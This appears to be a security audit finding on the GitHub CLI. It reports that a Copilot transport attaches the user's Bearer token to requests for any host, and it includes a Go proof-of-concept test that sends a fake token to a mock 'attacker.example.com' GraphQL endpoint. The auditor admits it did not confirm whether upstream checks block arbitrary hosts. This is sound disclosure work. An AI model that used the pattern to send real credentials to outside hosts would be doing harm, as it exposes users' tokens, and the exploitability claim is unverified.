### Title
Copilot-scoped Authorization Bearer token is sent to arbitrary GitHub hostnames via `GetPullRequestDatabaseID` due to unconditional header injection in `capiTransport.RoundTrip` - ([File: pkg/cmd/agent-task/capi/client.go])

### Summary
`capiTransport.RoundTrip` unconditionally sets `Authorization: Bearer <token>` on every outgoing request regardless of `req.URL.Host`, only gating the CAPI-specific headers (`Copilot-Integration-Id`, `X-GitHub-Api-Version`) on a host match. Because `GetPullRequestDatabaseID(ctx, hostname, owner, repo, number)` issues its GraphQL request through `api.NewClientFromHTTP(c.httpClient)` using an attacker/caller-supplied `hostname` parameter, the same real user token attached at `NewCAPIClient` construction is sent to whatever host that GraphQL query targets, not just `capiHost` or the client's configured `host`.

### Finding Description
`NewCAPIClient` wraps the caller-supplied `*http.Client` with `capiTransport`, whose `RoundTrip` does: [1](#0-0) 
Line 65 (`req.Header.Set("Authorization", "Bearer "+ct.token)`) runs for every request through this client, with no check against `req.URL.Host`. The host check on line 70 only conditionally adds Copilot-specific headers — it does not gate whether the Authorization header itself is sent.

`GetPullRequestDatabaseID` builds its GraphQL client from this same shared `c.httpClient` and passes a `hostname` argument directly into `apiClient.Query(hostname, ...)`: [2](#0-1) 
This is the only call site in the codebase that routes a request to a caller-determined `hostname` distinct from `c.capiBaseURL`/`c.host` through this transport. Since the underlying `http.Client`'s transport is `capiTransport`, whatever host `api.Client.Query` resolves the GraphQL endpoint for based on `hostname` will receive the Authorization header with the user's real token, unconditionally.

This differs from gh's general host-scoped credential model, where auth transports look up per-host tokens and typically only attach the corresponding host's token; here a single fixed token captured at `NewCAPIClient` construction time is force-attached to every destination regardless of host.

### Impact Explanation
If the `hostname` value reaching `GetPullRequestDatabaseID` can be influenced by attacker-controlled input (e.g., a crafted PR URL/reference passed to `gh agent-task view`), the victim's GitHub token would be sent as a Bearer credential to a host other than the intended GitHub/GHE host. This matches GitHub's bounty impact class of "authenticated request to an attacker host" / credential exfiltration to an unintended endpoint.

### Likelihood Explanation
I was unable to fully trace, within the available tool budget, how `hostname` is derived before reaching `GetPullRequestDatabaseID` — specifically the code in `pkg/cmd/agent-task/view/view.go` / `prShared.NewFinder` that resolves the PR/repo host from `opts.SelectorArg` or `--repo`, and whether `api.Client.Query`/`ghinstance` enforce that `hostname` must correspond to a locally configured, previously-authenticated host before issuing the request. If such validation exists (i.e., `hostname` must match a host gh already has credentials configured for, or ghrepo/ghinstance normalizes/rejects arbitrary external domains), then the practical attack surface for routing to a fully attacker-controlled domain (e.g., `attacker.example.com`) is likely blocked upstream, and the residual risk is limited to cross-host reuse among a user's own configured GitHub/GHE hosts rather than exfiltration to an arbitrary external server. I could not confirm this within the current investigation due to tool-call limits.

### Recommendation
Make `capiTransport.RoundTrip` scope the Authorization header the same way the integration headers are scoped: only attach `Authorization: Bearer <token>` when `req.URL.Host` matches either `capiHost` or an explicitly allow-listed GitHub API host for the configured `host`/hostname passed to `GetPullRequestDatabaseID`. Additionally, verify upstream (in `pkg/cmd/agent-task/view` / PR finder) that any `hostname` used for `GetPullRequestDatabaseID` is constrained to hosts the user has actually authenticated against (via `gh auth status`/config), rejecting arbitrary hostnames parsed from user-supplied PR URLs before they reach the CAPI client.

### Proof of Concept
```go
func TestCapiTransportLeaksTokenToArbitraryHost(t *testing.T) {
	reg := &httpmock.Registry{}
	reg.Register(
		httpmock.WithHost(httpmock.GraphQL(`.*`), "attacker.example.com"),
		httpmock.StringResponse(`{"data":{}}`),
	)
	defer reg.Verify(t)

	httpClient := &http.Client{Transport: reg}
	capiClient := capi.NewCAPIClient(httpClient, "victim-secret-token", "github.com", "https://api.githubcopilot.com")

	// hostname simulates attacker-controlled input (e.g., parsed from a malicious PR URL)
	_, _, _ = capiClient.GetPullRequestDatabaseID(context.Background(), "attacker.example.com", "owner", "repo", 1)

	// Expected (currently failing) assertion: Authorization header must NOT be sent to non-matching hosts
	for _, req := range reg.Requests {
		if req.URL.Host == "attacker.example.com" {
			require.Empty(t, req.Header.Get("Authorization"), "token leaked to non-GitHub host")
		}
	}
}
```
This test currently fails because `capiTransport.RoundTrip` sets the Authorization header unconditionally at [3](#0-2) , demonstrating the token is sent regardless of destination host.

func (ct *capiTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Set("Authorization", "Bearer "+ct.token)

	// Since this RoundTrip is reused for both Copilot API and
	// GitHub API requests, we conditionally add the integration
	// ID only when performing requests to the Copilot API.
	if req.URL.Host == ct.capiHost {
		req.Header.Add("Copilot-Integration-Id", "copilot-4-cli")

		// Ensure we are not using GitHub API versions while targeting CAPI.
		req.Header.Set("X-GitHub-Api-Version", "2026-01-09")
	}
	return ct.rp.RoundTrip(req)
